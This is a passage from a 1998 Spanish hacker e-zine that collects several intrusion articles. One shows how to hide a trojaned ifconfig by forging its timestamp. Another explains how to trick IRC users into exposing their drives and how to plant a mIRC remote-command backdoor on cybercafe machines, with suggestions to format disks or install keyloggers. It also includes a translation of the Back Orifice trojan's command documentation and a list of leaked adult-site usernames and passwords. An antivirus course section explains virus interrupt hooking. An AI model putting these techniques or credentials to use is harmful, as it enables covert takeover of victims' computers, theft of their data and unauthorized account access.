fecha de ayer el root a lo mejor se mosquea :). Para modificarle la fecha lo
mejor es pillarla de otro archivo del mismo directorio. For example: en el di-
rectorio /sbin hay un archivo llamado "halt",cuya linea completa es:

"-rwxr-xr-x   1 root     root         6564 Oct  2  1997 /sbin/halt*"

En cambio la del nuevo ifconfig es:

"-rwxr-xr-x   1 root     root        23368 May 8  1998 /sbin/ifconfig*"

Como veis,la fecha del ifconfig canta un poco. Pues poneis 
"touch -r /sbin/halt /sbin/ifconfig" y la nueva linea del ifconfig pasa 
 a a ser:

"-rwxr-xr-x   1 root     root        23368 Oct 2  1997 /sbin/ifconfig*"

Es decir, pilla la fecha de /sbin/halt y la copia a /sbin/ifconfig, asi ya
no canta tanto que lo has modificado. Despues de haber sobreescrito el ifconfig
por un troyano ya no aparecera lo de PROMISC, aunque hayas instalado un sni-
ffer.


7.- DESPEDIDA
*********************


Bueno,pues esto ha llegado a su fin. Espero que este texto os haya sido util,
sobre todo a la gente que empieza. Desde aqui quiero saludar a mi madre,a mi
abuela que me estara viendo .. XD. En serio, saludo a Minerva (que es mi novia
jeje), al canal #hacker_novatos del hispano y a toda la comunidad hacker 
hispana. Un saludo y hasta otra.


[^Pico^]
joskra@hotmail.com
welcome.to/neptuno

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i

mQENAzXrEhAAAAEIAMpdf1Cp68n09E9D1J7E0XyDRFLg5m3W+Q/kGScRndBAcXRP
o6lUbdhA6JV9UJIpQsg0GoHTdLMcid3oLMnQLw7YD3d0hcN0tMCMmoc9wxm3cZFO
RNoEUz5wIGt52j3yJWa7mK26V4+xIeWc346p/pnzRRDj6VLUO2xCwmIKP7/tcyce
zfdYIwewTnVkaArRiO/EfIrp03AMf7WOb9RcKVtKeqywi+CLh5Jxtr1KT2abJRG5
iRdElDhQaL0y4wUUKuf0IwaIOOyGlHOjWpZxF59Lh8YmNXACa/RO7sSHtMc2flp/
G384N7LIz53n+7a3YMq/9++L5I9wU+O7NqidbYUABRG0GVBpY28gPGpvc2tyYUBo
b3RtYWlsLmNvbT6JARUDBRA16xIQU+O7NqidbYUBAaVZCACQrYaTzsSv0r6zBmE0
CBa013q44/98++Pwguk3vvqbfVqbJylrn8iRCbhtuUS2JfIlTYoAA3d+E8JYD6ag
lEKCoulkvD2aji2YDdT7GEYUhjKDP7tAg1hbgT0vJlZMeDRZDLXDe3OJnuSQ2o9b
JNix4FbqxrpGrkk53sv4PMh2YLy/fVdaqkT3VHgl5PXHmeBx00proOnS9DgxYG9k
pl4GjqRDbokzf46Gb0u/ZvW75XFV3V0WJbo7k2SMFKN8ECAs+afT/Ux5ko6ACVWg
m+g/K+RLRUh7C6GgACovZBlp+OGGPlSrxBAMoAJbXXr7Fn2l9aORB9eZJ3MQ3DCl
fRPx
=ZGZH
-----END PGP PUBLIC KEY BLOCK-----
(((((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))

              ************------------************
              | COMO JUGAR CON HD AJENOS ATRAVES |
              |             DEL IRC              |
              ************____________************
                            POR: EMF


  He, he, he.... jugoso el título, no???
Bueno, pues ke yo sepa, he enkontrado 2 métodos:

* MÉTODO LAMER:
---------------
   El primero, lo llamo método lamer, porke es en el kual es necesario ke el
otro usuario tenga los menores konocimientos posibles. Resumiendo, ke sea un 
inkompetente total!.   Konsiste ni más ni menos en una orden del mIRC: /fserve.
Ahora si alguno no se ha bajado los doks sobre mIRC le tendría ke kastigar y 
todo eso... La orden fserve lo ke hace es ke nos ofrece una sesión de dcc get 
kon el usuario ke indikemos.Aunke más bien es al kontrario, el usuario 
hurgará en nuestro HD.   Enviamos ficheros por dcc, no?? Pues el fserve es ke 
el usuario se bajará lo ke kiera.
Hasta puede subir y bajar de direktorio, ¡borrar ficheros!, etc....
   La orden en konkreto sería:
/fserve nick 5 c:
/fserve ==> La orden en si de mIRC
nick    ==> Aki debe ir vuestro nick 
(si keréis hackear vosotros, aunke si ponéis EMF, no me pienso kejar X)
5       ==> Es el número maximo de ficheros ke os podéis bajar simultaneamente. 
            Podéis poner el número ke keráis.
c:      ==> La unidad ke vais a mirar. Si es otra letra..... mal rollo.
Este método es el + lamer, ya ke es necesario:
1.- Ke el tío no tenga ni pajolera idea de ke es un fserve.
2.- Ke el tío no tenga ningún skript, ya ke normalmente suelen regular el fserve
    ellos solitos,kon lo ke si no estás autentifikado por el usuario tendrías ke
    decirle ke te diera kréditos en su fserve. (Siempre se puede praktikar la 
    ingeniería social, pero..... en fin)
3.- Ke al tío no se le okurra mirar esas ventanitas ke aparecen 
    (NOTA: XDDDDDDDDDDDDDDDDDDDDDD)
    Vais a un kanal, por ejemplo #amor. Miráis la lista de nicks y al ke os de
    la impresion de ser más lamer le abrís un privado, diciéndole ke no 
    os funciona una kosa, ke pruebe a hacer la orden fserve y ya está!.
* METODO MENOS LAMER
--------------------
   El método menos lamer también es un pokillo lamer, pero es más kachondo!.
   Consiste en una orden del mIRC, aunke más ke una orden, 
   es un komando remoto. Es este:
   ctcp 1:*:$1-
   Este komando, introducido en los ctcp´s de mIRC, ejekuta kualkier orden 
   de forma remota.Es komo el antiguo /ctpc nick DO.
ctcp ==> Client-To-Client-Protocol. Los version, ping, etc...
1    ==> Nivel de usuario ke ejekuta el ctcp.
*    ==> Komo en DOS, komodín ke sustituye al ctcp ke nos hagan. Podríamos
         definir aki un VERSION PING, etc..
$1-  ==> Kon este parámetro, mIRC toma en konsideración todo lo ke nos envíen.
   Komo se usa?. Pos muy fácil. Yo he konseguido ke un lamer introduzka eso. 
   Y de repente me apetece ke el lamer me de op, si la tiene, en el kanal
   #amor. No?. Pos si tiene hecho eso, está perdido.... jejejejeje. Tekleo
   "/ctcp LAMER mode #amor +o EMF". Sin las komillas!!!!
  De repente... Dios, tengo op en #amor! :)
  Pero de inmediato el lamer se enfada. No me dio op, aunke en el kanal 
  pone ke sí!!! :P
  Pos me apetece dejarlo a mal kon sus kolegas. Muahahahhhahahhahaaahaahah. 
  Tekleo
  "/ctcp LAMER say Sois unos auténtikos #@%%$$%$$!!!!" (NOTA: Censored!)
  Y me fijo en el kanal y... Oh, cielos!. De repente lamer ha dicho eso!! XD
  Pos hala por maledukado le mando esto "/ctcp LAMER quit Me han echado".
  Bueno, komo siempre debemos de tener kuidao, ya ke la ventanita se le llenará 
  de mensajitos en rojo indikando nuestro nick.
  La sintaxis ya la habéis visto, no?. Para enviar komandos es simple:
/ctcp ==> Le indikamos a LAMER ke le va un CTCP.
LAMER ==> El nick del user, en este kaso LAMER.
          A kontinuación introducimos el komando ke keramos, kon sus parámetros 
          y todas esas kosas, aunke SIN la barra de introducción de komandos!!!.
   Añado, por cierto, ke si damos konseguido introducírselo al lamer, sería MUY 
   interesante el ke nos diéramos un nivel de usuario en el mIRC. Sino, korremos 
   el riesgo de ke kualkiera se de kuenta de esto y nos chafe la diversión. Aunke 
   también es un kante ke el lamer vea:
100:*!*@ctv666.ctv.es  ==> por ejemplo.
en su fichero de users de mIRC!. Eso sí. Si añadimos eso, debemos de cambiar 
el remoto por:
ctcp 100:*:$1-
  Y así solamente usuarios de level 100 (=nosotrox) podremos ejekutar esto.
  Nada más. Solamente indikaros ke el primer método funciona.... Y si no komeros 
  la kabeza!!!. No os voi a dar todo hecho :P
  El segundo método ESTÁ KOMPROBADO. Vas a un ciberkafeto, donde los dueños no 
  saben normalmente de la misa la mitad, y pegáis eso en el .ini korrespondiente.
  Por cierto ke no son los únikos métodos. Siempre hai kosas ke experimentar y hacer.
  Sino esto sería muy aburrido, no kreeis?? ;)
  Hai kosas más interesantes ke se pueden hacer kon la segunda opción, komo 
  konfigurarle remotamente el autoexec.bat, formatearle el HD!, etc... 
  O buskar archivos .pwl, instalar un keylog, etc... Eso ya keda de vuestra kuenta, 
  de si sois hackers o crackers. Para hacer esto habría ke realizar un skript sino 
  keremos pasarnos 2 horas tekleando komandos. Si me pega la 
  lokura igual hago uno y lo subo a la página. :)
   Bueno, no dejéis de mirar para:
    http://www.geocities.com/SiliconValley/Vista/8170
    newkers@hotmail.com
 Dentro de poko daré pistas para kazar los pass del grande, úniko y 
 gran botijo SCYTALE. :P



				© by EMF (1997) - the fuck wILDchILD
				  OZ  i®MaNDiNHo§ H.G. (1997)
      			    		NEWKERS(1997)

ESTAMOS DENTRO!!
(((((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))

                         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                         ¤  INFO DEL BACK ORIFICE   ¤ 
                         ¤       EN ESPAÑOL         ¤
                         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶


		El Culto de la Vaca Muerta : Comunicaciones
				presenta
			      Back Orifice
		    Sistema de administracion remota
			    v1.20 (30-7-1998)
			   Lanzamiento inicial

Back Orifice es una aplicacion cliente-servidor que permite al software 
cliente monitorizar , administrar , y realizar otras acciones de red y
multimedia en la maquina que esta ejecutando el servidor. Para comunicarse
con el servidor , tanto el cliente basado en texto como en graficos pueden
ejecutarse en cualquier maquina con Microsoft windows. El servidor solo 
funciona actualmente en Windows 95/98.

Este paquete contiene:

bo.txt 		(documentacion)
bo_esp.txt	(Este documento)
Plugin.txt 	(documentacion de programacion de extensiones para el 
		servidor)
boserve.exe 	(Servidor Auto-Instalable de Back Orifice)
bogui.exe 	(Cliente grafico para BO)
bocliente 	(cliente en modo texto), 
boconfig.exe 	(utilidad para configurar el nombre del ejecutable , el 
		puerto el password y la extension predeterminada para el 
		servidor BO)
melt.exe 	(un descompresor) 
frezze.exe 	(un compresor)

Para instalar el servidor , este tan solo necesita ser ejecutado. Cuando
el ejecutable del servidor se ejecuta , se instala a si mismo , y se borra.

Esto es util en entornos de red , donde el servidor puede ser instalado en
una maquina , simplemente copiando el ejecutable del servidor en el 
directorio Startup (o Inicio , en el caso español) , donde sera instalado y
luego borrado. Una vez que el servidor esta instalado en una maquina, se
iniciara cada vez que la maquina re-arranque.

Para actualizar una copia de BO de forma remota , simplemente manda la nueva
version del servidor al host remoto , y usa el comando Process spawn para
ejecutarlo. Cuando se ejecuta , el servidore automaticamente mata cualquier 
proceso que se llame como el programa a instalar , e intenta instalarse 
sobre la vieja version , se autoejecuta desde su posicion de instalacion,
y borra el exe que acaba de ejecutar.

Antes de la instalacion , algunos de los aspectos del servidor pueden ser
configurados. El nombre de fichero que usa el BO para instalarse a si mismo,
el puerto en el que estara escuchando el servidor , y el password usada para
encriptar pueden ser configurados con la utilidad boconf.exe. Si el servidor
no se configura , usara el puerto 31337, sin password (aunque las 
comunicaciones siguen estando encriptadas), y se instala a si mismo como
" .exe" (espacio punto exe)

El cliente se comunica con el servidor via paquetes UDP encriptados. Para
una comunicacion con exito , el cliente necesita mandar al mismo puerto al
que esta escuchando el servidor , y la password del cliente debe ser la 
misma con la que esta configurado el servidor.

El puerto al que el cliente manda sus paquetes puede ser establecido con la
opcion -p tanto en el cliente grafico como en el de texto. Si los paquetes
estan siendo filtrados o existe un firewall , puede ser necesario mandar
desde un puerto que no sea filtrado y/o bloqueado. Ya que las comunicaciones
por UDP son sin conexion , los paquetes pueden ser bloqueados tanto en su
camino hacia el servidor como en la vuelta hacia el cliente.

Las acciones son realizadas en el servidor mandando comandos desde el cliente
a una direccion ip especifica. Si la maquina servidora no esta en una 
direccion IP fija (caso habitual si se accede a traves de Infobirria), puedes
localizarla utilizando el barrido o los comandos de barrido (sweep) en los
cliente usando el dialogo "ping..." o poniendo una direccion IP destino del
tipo "1.2.3.*". Si se barre una lista de subredes , cuando una maquina con
el servidor instalado responde , el cliente mirara en el mismo directorio
que contiene la lista de subredes y mostrara la primera linea del 
primer archivo que encuentre con el nombre de archivo de la subred.

Las ordenes actualmente implementadas en BO se listan abajo. Algunos de los
nombres pueden ser diferentes entre la version texto y grafica de los 
clientes, pero la sintanxis es la misma para practicamente todos los 
comandos. Mas informacion sobre cualquier orden se puede conseguir usando
el comando "help <command>". El cliente grafico pone las etiquetas de los
dos campos parametro con una descripcion de los argumentos que cada orden
acepta, cuando se selecciona ese comando de la lista de ordenes(Command List)
Si parte de la informacion requerida no se proporciona con la orden , el
servidor devolvera el error "Missing data". Las ordenes de BO son

(gui/texto Comando)

App add/appadd
Lanza una aplicacion basada en texto en un puerto tcp. Esto permite que 
tengas el control de una aplicacion de texto o MS-DOS desde una sesion 
de telnet (por ejemplo , command.com)

App del/appdel
Hace que una aplicacion deje de esperar conexiones

Apps list/applist
Lista las aplicaciones que esten esperando conexion

Directory create/md
Crea un directorio

Directory list/dir
Lista los ficheros y directorios. Debes especificar un comodin si quieres que
mas de un fichero sea listado.

Directory remove/rd
Borra un directorio.

Export add/shareadd
Crea una comparticion en el servidor. El icono de directorio o unidad 
exportado no se ve modificado por la el icono de la mano.

Export delete/sharedel
Borra una comparticion.

Exports list/sharelist
Lista los nombres de las comparticiones actuales, la unidad o directorio
que esta siendo compartido , el acceso para esta comparticion , y el 
password para esta comparticion.

File copy/copy
Copia un fichero

File delete/del
Borra un fichero

File find/find
Busca en un arbol de directorios los ficheros que correspondan con los
comodines especificados.

File freeze/freeze
Comprime un fichero

File melt/melt
Descomprime un fichero

File view/view
Ver el contenido de un fichero de texto.

HTTP Disable/httpoff
Deshabilita el servidor HTTP.

HTTP Enable/httpon
Habilita el servidor HTTP

Keylog begin/keylog
Graba las pulsaciones de tecla en la maquina servidora a un fichero
de texto. El log muestra el nombre de la ventana en la que fue introducido
el texto.

Keylog end
Para la captura de teclado. Para terminar la captura desde el cliente texto,
usa "keylog stop".

MM Capture avi/capavi
Captura video y audio (si se puede) desde cualquier dispoditivo de captura
de video disponible a un fichero avi.

MM Capture frame/capframe
Captura un fotograma de video y lo graba en un fichero bmp

MM Capture screen/capscreen
Captura una imagen de la pantalla de la maquina servidora en un fichero bmp

MM List capture devices/listcaps
Muestra una lista de los dispositivo de captura de video.

MM Play sound/sound
Toca un fichero wav

Net connections/netlist
Muestra las conexiones de entrada y salidas a la red

Net delete/netdisconnect
Desconecta la maquina servidora de un recurso de red.

Net use/netconnect
Conecta la maquina servidora a un recurso de red.

Net view/netview
Ve todos los interfaces de red , dominios , servidores , y comparticiones
accesibles desde la maquina servidora.

Ping host/ping
Ping a la maquina. Devuelve el nombre de la maquina y el numero de version
del su BO.

Plugin execute/pluginexec
Ejecuta una extension BO. Ejecutar funciones que no se ajusta al interfaz
de extensiones de BO , causa el cuelgue del servidor.

Plugin kill/pluginkill
Le dice a una extension que pare y se retire.

Plugins list/pluginlist
Lista las extensiones activas o el valor de retorno de una extension que
ha salido (terminado)

Process kill/prockill
Terminar un proceso.

Process list/proclist
Muestra los procesos en ejecucion.

Process spawn/procspawn
Ejecuta un programa. Desde el gui, si el segundo parametro se especifica,el
proceso sera ejecutado como un proceso normal , visible. Si no , sera 
ejecutado escondido o camuflado

Redir add/rediradd
Redirecciona las conexiones tcp entrantes o paquetes udp a otra direccion IP

Redir del/redirdel
Para la redireccion de puerto.

Redir list/redirlist
Lista todas las redirecciones de puerto.

Reg create key/regmakekey
Crea una clave en el registro.
NOTA; Para todos los comandos de registro , no especificar los \\ del final
para los valores del registro.

Reg delete key/regdelkey
Borra una clave del registro.

Reg delete value/regdelval
Borra un valor del registro.

Reg list keys/reglistkeys
Lista las subclaves de una clave del registro.

Reg list values/reglistvals
Lista los valores de una clave de registro.

Reg set value/regsetval
Establece un valor para una clave de registro. Los valores son especificados
como un tipo seguidos de una coma , y despues el dato del valor. Para valores
binarios (Tipo B) el valor es una serie de dos digitos con valores 
hexadecimales. Para valores DWORD (tipo D) el valor es un numero decimal. 
Para valores de cadena (tipo S) el valor es una cadena de texto.

Resolve host/resolve
Resuelve la direccion IP de una maquina relativa a la maquina servidor. El
nombre de la maquina puede ser un nombre internet o de red local.

System dialogbox/dialog
Crea una caja de dialogo en la maquina con el texto especificado , y un 
boton "ok". Puedes crear tantas cajas de dialogo como quieras, ellas 
sencillamente iran en cascada frente a la caja anterior.

System info/info
Muestra informacion del sistema de la maquina servidora. La informacion
mostrada incluye el nombre de la maquina , usuario actual , tipo de CPU,
memoria total y disponible, informacion de la version de windows , e 
informacion sobre las unidades (fijas , CD-rom, removible,remota) , y para 
las unidades fijas , el tamaño y espacio libre.

System lockup/lockup
Bloquea la maquina servidora.

System passwords/passes
Muestra las passwors en cache para el usuario actual y la password de su
salvapantallas. Pueden tener basura enganchada al final.

System reboot/reboot
Apaga la maquina y la reinicia.

TCP file receive/tcprecv
Conecta el servidor a una direccion IP/Puerto y guarda cualquier dato 
recibido de esa coinexion al fichero especificado.

TCP file send/tcpsend
Conecta la maquina servidora a una IP/Puerto especifico y manda el contenido
de un fichero especifico , luego desconecta.
NOTA:  Para transferecias TCP de ficheros , la direccion IP y el puerto 
deben estar escuchando antes de que el comando de fichero tcp sea mandado , 
o fallara. Un utilidad para trasnferencias de este tipo es netcat , que esta
disponible tanto para Unix como para Win32
Los ficheros pueden ser transferidos DESDE el servidor usando el comando
tcp dile send , y netcat con una sentencia del tipo :
netcat -l -p 666 > fichero
Los ficheros pueden ser transferidos AL servidor usando el comando 
tcp file receive command y netcat con una sentencia del tipo :
netcat -l -p 666 < fichero
NOTA:  la version win32 de netcat no desconecta ni sale cuando encuentra
el fin del fichero de entrada. Despues de que el contenido del fichero
ha sido transferido , termina el netcat con  ctrl-c o ctrl-break.


BOConfig:
BOConfig.exe te permite configurar las opciones para un servidor BO antes
de que se instale. Te pregunta el nombre del ejecutable , cual es el nombre
que BO usara para instalarse en el directorio del sistema. No tiene porque
terminar en .exe , pero no agregara .exe si no le das una extension de 
fichero. Despues te pregunta por una descripcion del fichero .exe si no
le das una extension exe que describira el exe en el registro donde sera
iniciado durante el arranque. Entonces pregunta por el puerto por donde el 
servidor esperara los paquetes, y una password para la encriptacion. Para 
comunicarse el servidor con el cliente , el cliente debe tener la misma 
password. Puede ser nula. Despues pregunta por la extension para ejecutar
al iniciar. Esto es una DLL y nombre de funcion , del tipo "DLL:_Funcion" 
de una extension de BO que se ejecutara automaticamente cuando el servidor
se inicie. Puede ser nula. Entonces , te permite entrar cualquier argumento
que quieras pasarle a la extension en arranque. Tambien puede ser nula. Y 
finalmente , te pregunta por la localizacion del fichero que sera unido al
servidor , que sera escrito al directorio del sistema cuando el servidor se
inicie. Este puede ser una extension del BO que se ejecute automaticamente.
El servidor funcionara sin ser configurado. Por defecto , comunica al puerto
31337 sin password , e instalandose como " .exe"


			(TRADUCCION : Cthulhu)
		

Known bugs/problems:
MM Capture screen - The bitmap is saved in whatever resolution and pixel depth
the server machine is running in.  As a result, bitmaps may be produced with
color depths of 16 bit or 24 bit.  Most graphics applications can only deal
with 8 or 32 bit bitmaps and will either be unable to load the bitmap or
display it incorrectly (this includes Graphics Workshop for Windows, Photoshop,
and the WANG Imaging distributed with Windows.  There is, however, a program
that comes with Windows will view it.  Paint.exe.  Go figure.

Keyboard logging - Apparently ms-dos windows don't have a message loop, which
prevents the ability to log keys that are typed into them.

Text based application tcp redirection (App add) - Several bugs.  When
command.com is spawned with it's handles redirected, the system also spawns
REDIR32.EXE, which it does not apear possible to terminate.  (This seems os
interface that communicates with a tsr module loaded in the dos session to
redirect the input and output handles to pipes)  So if you terminate the tcp
connection before the application has terminate (or you have 'exit'ed it),
REDIR32.EXE and WINOA386.MOD (the 'old application' (16 bit) wrapper) will
remain running, and neither Back Orifice nor the operating system itself will
be able to terminate them.  This even prevents the system from being able to
shut down, it just sits at the 'Please wait...' screen forever.
There also seems to be problems redirecting the output from some console
applications (such as FTP.EXE, and unfortunately currently boclient.exe).
Altho output from the program is not relayed out, input may still be relayed
in, so you can often quit the program through the tcp session.  Otherwise use
Back Orifice to kill the executable.


Send questions, comments, bitches and bugs to bo@cultdeadcow.com.





    .-.                             _   _                             .-.
   /   \           .-.             ((___))             .-.           /   \
  /.ooM \         /   \       .-.  [ x x ]  .-.       /   \         /.ooM \
-/-------\-------/-----\-----/---\--\   /--/---\-----/-----\-------/-------\-
/lucky  13\     /       \   /     `-(' ')-'     \   /       \     /lucky  13\
           \   /         `-'         (U)         `-'         \   /
            `-'              the original e-zine              `-'    _
      Oooo                    eastside westside                     / )   __
 /)(\ (   \                       WORLDWIDE                        /  (  /  \
 \__/  )  /  Copyright (c) 1998 cDc communications and the author. \   ) \)(/
       (_/     CULT OF THE DEAD COW is a registered trademark of    oooO
              cDc communications, PO Box 53011, Lubbock, TX, 79453, USA.      _
  oooO                      All rights reserved.                    __   ( \
 /   ) /)(\                                                        /  \  )  \
 \  (  \__/       Save yourself!  Go outside!  Do something!       \)(/ (   /
  \_)                     xXx   BOW to the COW   xXx                    Oooo

                            http://www.cultdeadcow.com



Microsoft, Windows, Windows 95, Windows 98, and Windows NT are all registered
trademarks of the Microsoft Corporation. (jejejejeje)
((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))

               ######################################
               #   Passwords de webs xXxXxXxXxX     #
               ######################################

        AVISO: PUEDE QUE LA MAYOR PARTE DE ESTOS PASSWORDS
               YA NO FUNCIONEN DEVIDO A QUE CAMBIAN MUY 
               AMENUDO LAS CONTRASEÑAS,OSEA QUE NO ME MANDEIS
               E-MAILS DICIENDO:"PUES EL PASSWORD DE TAL WEB
               NO FUNCIONA ¿TIENES EL NUEVO?"
               POR QUE NO,NO LO TENGO ¿FALE COLEG@S?
-----------------------------------------------------------------------------------------------

http://pussy:man@www.gate.net/~tortaz/ea.htm
http://adultlink.itexas.com/
http://www.flashback.net/~agent/AgentGirls.html
http://4240:4240@www.amber-a.com/protected/memfirst.htm
http://199.227.251.67/
http://www.xpics.com/ass/ass.html?acb=acb141612-64700
http://lucky:rules@beastiality.nudecoeds.com/thumbs/pets/
http://www.bekkoame.or.jp/~masakaz/okini/
http://netman:ford@www.bestgirl.com/adult/
http://hornyxxx.com/bigtits/3/
http://www.algonet.se/~bigpack/shc/pics/
http://43685:82549@www.greatcelebs.com/members/
http://219:219@www.breathlessboys.com/protected/
http://poutsa:poutsa@www.breathlessboys.com/protected/
http://grimlock:grimlock@www.brothel.com/Member/Members.html
http://www.moonmistique.com/cammy/gallery.htm
http://jimbo:golf@members.campusbabes.com/
http://mamicu:ti@www.10000celebs.com/sasa.htm
http://ircok:youlamer@www.erotic-express.com/member/eng/
http://anon:12345@eyerotic.com/members/index.html
http://larry:larry1@www.fetish.com/members/main.html
http://dog:money@www.thegirlshouse.com/members/
http://gary:mysmut@hot4you.netaxs.com/members/
http://puff:daddy@www.kingporno.com/authorized/
http://jim:jim@www.kingporno.com/authorized/teens/teens/page.html
http://fitness:83963@www.littlesisters.com/members/
http://8ball:39653@www.littlesisters.com/members/
http://209.75.20.71/members/members.html
http://www.megapussy.com/members/
http://cali:cali@www.hollywoodxposed.com/secure/celebs.html
http://beach:beach@www.hollywoodxposed.com/secure/celebs.html
http://kev:shit@www.hollywoodxposed.com/secure/celebs.html
http://www.netwave.net/members/bdonath/pond/97/
http://crew:crew@perfectwomen.ml.org/getem/
http://jme42:seaside@www1.pictureview.com/groupindex.html
http://tinman:ozzy@members.pinkcity.com/
http://www.playhousenet.com/images/album/
http://filly:goodsex25@www.pornbooth.com/vids/index1.html
http://porno:archive@members.pornheaven.com/
http://elite2.com/sassys/graphics/amature/
http://qwert:qwert@www.schoolgirlz.com/members/
http://www.sexave.com/pics/
http://12002:pit@www.sexshots.com/img/index2.html
http://secret:secret@www.sexualeuphoria.com/members/index.html
http://pornboy:123@smutlandia.webdomains.com/members/
http://www.grayghost1.com/ntrtmv1np.htm
http://w76yeh:programbo@www.demon.nl/uncensored/sex/pictures.html
http://shu87f:programbo@www.demon.nl/uncensored/sex/pictures.html
http://s7htuj:programb@www.demon.nl/uncensored/sex/pictures.html
http://mandiga:aceman@barbados.janey.com/~sexhub/valerie/members/phantom.html
http://www.videosexchannels.com/?acb=acb141612-k0700
http://rhwkz56:24083@www.wildfantasies.com/members/
http://asdf:asdf@www.carolcox.com/pictures/index.html
http://mp100:f455@www.xxxensation.com/cgi-sec/xxxlogin
http://kpyht:prtzq@www.xxxensation.com/cgi-sec/xxxlogin
http://www.xxxsexphotos.com/?acb=acb141612-n0300
http://www.111sexstreet.com/private/sex02.html L:creator P:sindy 
http://www.moontan.com/Eden/ l:take p:me
http://www.buttsville.com/members/members.m.html L:LocoOwns P:LameMoon
http://www.extremeadultsex.com/members/ l:heandshe p:cliff30
http://www.69cyberline.com/members/index.html l:nathan p:nathan
http://www.outpost69.com/members/index.html l:netboy p:isreallybad
((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))

                 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                 ^    CURSO DE ANTIVIRUS 1ª parte    ^
                 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Cursillo de creación de antivirus (I).

Primer capítulo: INTRODUCCION

Disposición Legal:

El motivo del presente curso es instruir a aquel que lo siga en el 
conocimiento de las técnicas usadas para
combatir virus, empezando por las más básicas para acabar en las úl
timas novedades. Para ello
profundizaré en el conocimiento del código vírico con el único propósito
 de poner al lector en disposición
de saber a qué nos enfrentamos cuando luchamos contra esta lacra del 
mundo informático. La
información contenida en el curso es información técnica que puede 
utilizarse en la fabricación de un
virus. De ahí que la responsabilidad única es del lector, y a su 
elección queda usar bien o mal la
información aquí relatada. Del mismo modo es su responsabilidad
 ejecutar cualquier código aparecido en
el curso en su propio ordenador o en el de terceros, declinando 
yo toda responsabilidad por los posibles
daños causados.

Para evitar en la medida de lo posible el uso fraudulento de esta 
información no daré en ningún momento
el código completo de ningún virus, sino sólo rutinas sueltas. De 
ese modo la confección de un virus a
partir de las rutina mostradas en el curso es una labor que requiere 
un esfuerzo por parte del lector y por
tanto un delito consciente.

De ahí que yo, el autor, declino toda responsabilidad civil y/o legal 
que discurra de la utilización
fraudulenta de esta información. El responsable único y último será el 
lector si decide usarla para
dichos fines. El autor: Manuel Llorens.
******************************************************************************

He creído conveniente comenzar el curso explicando cada una de las preguntas de 
la encuesta, dada la
variedad de respuestas que he recibido. No me extenderé en aquellas que por su 
carácter meramente
técnico pertenezcan más al curso de ASM de Pablo Barrón que al presente. Cada 
uno de los puntos se
desarrollará a lo largo del curso allí donde sea conveniente. Aún no he decidido 
el 'índice' del mismo, que
ya incluiré en el próximo número (es por esperar a tener el mayor número posible 
de encuestas)

¿Sabes para lo que sirve una interrupción? Una interrupción es el modo que tiene 
un programa
ensamblador de ejecutar servicios y funciones del BIOS (Basic Input Output System, 
más conocido
como la ROM) y el DOS. La mayoría de los virus 'interceptan' estas interrupciones 
de modo que cada
vez que se ejecuta uno de dichos servicios el virus supervisa lo que está haciendo 
el programa que
ejecutó la interrupción, a este proceso se le denomina 'instalar un gestor de 
interrupción'. La instrucción
ensamblador que ejecuta una interrupción es

int número_de_la_interrupción.

La dirección de cada gestor de interrupción (vector de interrupción) se guarda 
en una tabla a partir de la
dirección 0000:0000, y cada vector ocupa 4 bytes (seg:off).

¿Sabes instalar un gestor de interrupción? Pues tan fácil como esto:

mov ah,25h (servicio establecer vector de interrupción) mov al,
interrupción_a_capturar (entre 0 y 255)
lds dx,gestor_de_interrupción (dirección de la rutina gestora) int 21h 
(llama a la interrupción del DOS)

Otro método que puede usarse si no se quiere llamar al DOS es el siguiente:

xor ax,ax mov ds,ax mov bx,4*interrupción_a_capturar mov [bx],offset 
gestor_de_interrupción mov
[bx+2],cs (si el gestor está en el mismo segmento que el actual)

Generalmente es necesario guardar previamente el gestor de interrupción 
actual antes de cambiarlo por el
nuestro con el fin de volver a instalar en antiguo al salir del programa. 
También generalmente es
necesario que nuestro propio gestor de interrupción llame al antiguo. Por 
ejemplo un virus captura la
interrupción 21h (la del DOS) si 'detecta' que el programa que la ejecutó 
está intentando abrir un fichero
(mediante ah=3Dh) lo tratará de infectar y finalmente dejará que el DOS lo 
abra, llamando al gestor de
interrupción antiguo. Igualmente si la función que el programa ejecuta no es 
útil a nuestro virus la dejará
pasar al DOS 'intacta'.

¿Conoces la forma en la que arranca el DOS? El proceso difiere ligeramente 
según se arranque desde el
HD o desde un disquete, pero básicamente a grandes rasgos es el que sigue:

Primero se ejecuta una rutina que reside en el MBR (ver más abajo) que se 
encarga de cargar el sector
BOOT de la partición activa. Si se está arrancando desde un disquete el 
proceso es similar solo que no
existe MBR ni tabla de partición, ya que el sector BOOT siempre está en 
la misma posición (el primero
del disco). Se ejecuta el código contenido en el BOOT. El BOOT carga 
IO.SYS e MSDOS.SYS a partir
de 0070:0000 o presenta un mensaje de error si el disco no era de arranque. 
A continuación ejecuta
IO.SYS (una rutina contenida en el que se denomina SYSINIT) el cual ejecuta 
a su vez MSDOS.SYS.
Cuando MSDOS.SYS devuelve el control a SYSINIT este carga el CONFIG.SYS 
lo procesa y al final
entrega el control a COMMAND.COM para que cargue el autoexec.bat

Este proceso de carga es muy importante dado que si un virus consigue 
infectar el MBR o el BOOT
toma el control del ordenador antes que ningún otro programa. A partir 
de aquí tendremos en cuenta la
siguiente máxima del mundo de los virus:

"Toda porción de código ejecutable es susceptible de ser infectada" 
"Toda porción de código no
ejecutable puede ser infectada pero nunca puede dar lugar por si sola 
a una infección" (por ejemplo un
mensaje nunca puede dar lugar a una infección, aunque sí puede haber 
sido infectado por un virus como
modo de guardar en él sus datos).

¿Sabes lo que es el DTA? Es el Disk Transfer Address. Básicamente es 
una zona de memoria que se
crea al ejecutar cada programa y que sirve para que las funciones del 
DOS devuelvan información al
programa a través de aquellas interrupciones que no piden explícitamente 
una dirección de memoria. Por
